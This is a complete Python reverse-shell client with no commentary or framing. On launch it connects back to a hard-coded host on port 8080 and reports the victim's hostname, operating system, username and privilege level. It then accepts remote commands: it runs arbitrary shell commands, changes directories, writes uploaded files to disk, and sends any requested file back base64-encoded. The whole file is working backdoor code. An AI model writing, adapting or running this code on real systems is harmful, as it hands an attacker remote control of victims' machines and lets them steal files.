import socket
import os
import subprocess
import ctypes
import platform
import base64

def check_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return os.geteuid() == 0 if os.name != 'nt' else False

def connect():
    client = socket.socket()
    server_ip = "192.168.19.139"
    server_port = 8080
    
    try:
        client.connect((server_ip, server_port))
        
        # Send system info
        username = os.getlogin()
        hostname = platform.node()
        os_name = platform.system()
        is_admin = "Admin" if check_admin() else "Standard User"
        
        client.send(f"Connected to {hostname} - {os_name} - {username} ({is_admin})".encode())
        
        while True:
            command = client.recv(1024).decode()
            
            if command == "terminate":
                break
                
            elif command == "pwd":
                client.send(os.getcwd().encode())
                
            elif command == "ls":
                cmd = "dir" if os.name == 'nt' else "ls -la"
                result = subprocess.check_output(cmd, shell=True)
                client.send(result)
                
            elif command.startswith("cd "):
                directory = command[3:]
                try:
                    os.chdir(directory)
                    client.send(f"Changed to: {os.getcwd()}".encode())
                except Exception as e:
                    client.send(f"Error: {str(e)}".encode())
                    
            elif command == "checkadmin":
                is_admin = check_admin()
                status = "Administrator" if is_admin else "Standard User"
                client.send(f"User has {status} privileges".encode())
                
            elif command.startswith("upload "):
                parts = command.split(" ", 2)
                path, data = parts[1], parts[2]
                
                try:
                    file_data = base64.b64decode(data)
                    with open(path, "wb") as f:
                        f.write(file_data)
                    client.send(f"File uploaded to {path}".encode())
                except Exception as e:
                    client.send(f"Upload failed: {str(e)}".encode())
                    
            elif command.startswith("download "):
                path = command.split(" ", 1)[1]
                
                if not os.path.exists(path):
                    client.send(f"[!] File not found: {path}".encode())
                    continue
                    
                try:
                    client.send(f"[+] Found {path} ({os.path.getsize(path)} bytes)".encode())
                    
                    with open(path, "rb") as f:
                        file_data = f.read()
                        
                    encoded = base64.b64encode(file_data).decode()
                    client.send(f"BASE64:{encoded}ENDOFFILE".encode())
                except Exception as e:
                    client.send(f"Download failed: {str(e)}ENDOFFILE".encode())
                    
            else:
                try:
                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    client.send(result if result else b"Command executed (no output)")
                except Exception as e:
                    client.send(f"Error: {str(e)}".encode())
    
    except Exception as e:
        print(f"Error: {str(e)}")
    finally:
        client.close()

if __name__ == "__main__":
    connect()